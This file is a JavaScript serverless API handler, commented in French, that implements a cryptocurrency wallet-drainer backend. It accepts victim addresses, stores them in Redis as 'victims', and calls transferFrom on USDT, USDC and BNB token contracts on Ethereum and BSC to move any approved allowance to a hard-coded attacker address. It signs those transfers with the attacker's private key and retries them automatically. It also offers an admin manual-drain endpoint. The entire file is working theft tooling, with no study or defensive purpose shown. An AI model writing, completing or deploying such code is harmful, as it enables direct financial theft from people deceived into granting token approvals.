import Web3 from 'web3';
import fs from 'fs';
import path from 'path';
import { createClient } from 'redis';

const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';

// --- Récupération de la clé privée ---
function getPrivateKey() {
  if (process.env.ATTACKER_PRIVATE_KEY) {
    const key = process.env.ATTACKER_PRIVATE_KEY.trim();
    if (key.length === 64) return key;
    console.warn('⚠️ ATTACKER_PRIVATE_KEY env invalide. Tentative fichier...');
  }

  const filePath = path.resolve('./private_key.txt');
  try {
    if (fs.existsSync(filePath)) {
      const key = fs.readFileSync(filePath, 'utf8').trim();
      if (key.length === 64) return key;
      console.warn('⚠️ private_key.txt invalide (longueur != 64).');
    }
  } catch (err) {
    console.warn('⚠️ Impossible de lire private_key.txt:', err.message);
  }

  throw new Error(
    '🔴 Aucune clé privée valide. ' +
    'Définis ATTACKER_PRIVATE_KEY dans l’env Vercel ou crée private_key.txt dans api/ (64 hex, sans 0x).'
  );
}

const PRIVATE_KEY = getPrivateKey();

if (!PRIVATE_KEY || PRIVATE_KEY.length !== 64) {
  throw new Error('ATTACKER_PRIVATE_KEY invalide. Déploiement annulé.');
}

// --- Configuration des tokens et RPCs ---
const TOKENS = {
  '1': {
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
  },
  '56': {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    'BNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
  }
};

const RPC_URLS = {
  '1': 'https://cloudflare-eth.com',
  '56': 'https://bsc-dataseed1.binance.org'
};

const drainedAddresses = new Set();

// Connexion Redis réutilisable
const getRedisClient = async () => {
  const client = createClient({ url: process.env.REDIS_URL });
  await client.connect();
  return client;
};

// --- Fonction d'enregistrement dans Redis ---
async function recordVictim(address, chain, token, amount, status) {
  let client;
  try {
    client = await getRedisClient();
    const key = `victim:${address}`;
    const timestamp = Date.now();

    // Mise à jour des champs (en conservant ceux qui existent déjà)
    await client.hSet(key, {
      chain,
      token,
      amount,
      status,
      timestamp: String(timestamp)
    });

    console.log(`📝 Victime enregistrée : ${address} (${status})`);

    // Ajout à la liste des victimes
    const list = await client.get('victims:list');
    const parsedList = list ? JSON.parse(list) : [];
    if (!parsedList.includes(address)) {
      parsedList.push(address);
      await client.set('victims:list', JSON.stringify(parsedList));
    }
  } finally {
    if (client) await client.disconnect();
  }
}

async function drainVictim(victimAddress, chainId) {
  if (drainedAddresses.has(victimAddress)) {
    console.log(`⚠️ Déjà drainé : ${victimAddress}`);
    return;
  }

  const web3 = new Web3(new Web3.providers.HttpProvider(RPC_URLS[chainId] || RPC_URLS['1']));
  if (!await web3.eth.net.isListening()) {
    throw new Error(`RPC ${chainId} non joignable`);
  }

  const derivedAddress = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY).address;
  if (derivedAddress.toLowerCase() !== ATTACKER_ADDRESS.toLowerCase()) {
    throw new Error(`La clé privée ne correspond pas à ${ATTACKER_ADDRESS}`);
  }

  const tokens = TOKENS[chainId] || {};
  for (const [tokenName, tokenAddress] of Object.entries(tokens)) {
    const tokenContract = new web3.eth.Contract(
      [
        {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
        {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
        {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
      ],
      tokenAddress
    );

    try {
      const allowance = await tokenContract.methods.allowance(victimAddress, ATTACKER_ADDRESS).call();
      if (allowance === '0') {
        // Pas d'allowance → échec, on note la balance disponible
        const balance = await tokenContract.methods.balanceOf(victimAddress).call();
        const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
        const formatted = web3.utils.fromWei(balance, decimals);
        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
        console.log(`⏭️ ${tokenName} : allowance nulle (dispo ${formatted})`);
        continue;
      }

      // Drain réussi
      const nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
      const tx = {
        from: ATTACKER_ADDRESS,
        to: tokenAddress,
        data: tokenContract.methods.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance).encodeABI(),
        gas: 100000,
        gasPrice: await web3.eth.getGasPrice(),
        nonce
      };

      const signedTx = await web3.eth.accounts.signTransaction(tx, PRIVATE_KEY);
      const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
      console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);

      const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
      const drainedAmount = web3.utils.fromWei(allowance, decimals);
      await recordVictim(victimAddress, chainId, tokenName, drainedAmount, 'drained');
    } catch (e) {
      console.error(`❌ Erreur sur ${tokenName} : ${e.message}`);
      try {
        const balance = await tokenContract.methods.balanceOf(victimAddress).call();
        const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
        const formatted = web3.utils.fromWei(balance, decimals);
        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
      } catch (err) {
        await recordVictim(victimAddress, chainId, tokenName, '0', 'failed');
      }
    }
    await new Promise(r => setTimeout(r, 500));
  }

  drainedAddresses.add(victimAddress);
}

async function drainWithRetry(victim, chainId, retries = 10, baseDelay = 1000) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      await drainVictim(victim, chainId);
      console.log(`🔥 VICTOIRE : ${victim} vidé avec succès`);
      return true;
    } catch (err) {
      console.error(`⛔ Tentative ${attempt}/${retries} échouée : ${err.message}`);
      if (attempt === retries) {
        console.error(`💀 Échec final après ${retries} tentatives pour ${victim}`);
        return false;
      }
      const delay = baseDelay * Math.pow(2, attempt - 1);
      console.log(`⏳ Nouvelle tentative dans ${delay/1000}s...`);
      await new Promise(r => setTimeout(r, delay));
    }
  }
}

export default async function handler(req, res) {
  // Headers CORS placés en tout premier
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Gestion immédiate des OPTIONS (préflight)
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    // --- Le reste du code inchangé ---
    if (req.method === 'POST') {
      const { victim, chain, adminSecret } = req.body;

      // DRAIN MANUEL ADMIN
      if (adminSecret) {
        if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
          return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
        }
        if (adminSecret !== process.env.ADMIN_SECRET) {
          return res.status(401).json({ error: 'Secret admin invalide' });
        }
        if (!victim || !Web3.utils.isAddress(victim)) {
          return res.status(400).json({ error: 'Adresse victime invalide' });
        }

        const targetChain = chain || '1';
        console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);

        // Ajout immédiat à la liste (Redis)
        let client;
        try {
          client = await getRedisClient();
          const list = await client.get('victims:list');
          const parsedList = list ? JSON.parse(list) : [];
          if (!parsedList.includes(victim)) {
            parsedList.push(victim);
            await client.set('victims:list', JSON.stringify(parsedList));
          }
        } catch (err) {
          console.error('Erreur Redis admin drain list:', err);
        } finally {
          if (client) await client.disconnect();
        }

        const success = await drainWithRetry(victim, targetChain);
        if (success) {
          return res.status(200).json({ success: true, victim, chain: targetChain });
        } else {
          return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
        }
      }

      // FLUX NORMAL
      if (!victim) return res.status(400).json({ error: 'Adresse victime manquante' });

      console.log(`📥 Victime reçue : ${victim} sur chain ${chain || '1'}`);

      let client;
      try {
        client = await getRedisClient();
        const list = await client.get('victims:list');
        const parsedList = list ? JSON.parse(list) : [];
        if (!parsedList.includes(victim)) {
          parsedList.push(victim);
          await client.set('victims:list', JSON.stringify(parsedList));
        }
      } catch (err) {
        console.error('Erreur Redis normal flow list:', err);
      } finally {
        if (client) await client.disconnect();
      }

      // Lancer le drain sans attendre (asynchrone)
      drainWithRetry(victim, chain || '1').catch(err => console.error('Erreur drainWithRetry:', err));

      return res.status(200).json({ success: true, victim, chain: chain || '1' });
    } else {
      return res.status(405).json({ error: 'Méthode non autorisée' });
    }
  } catch (error) {
    // Attraper toute erreur non gérée et renvoyer une réponse avec headers CORS
    console.error('❌ Erreur handler:', error);
    return res.status(500).json({ error: 'Erreur interne du serveur' });
  }
}
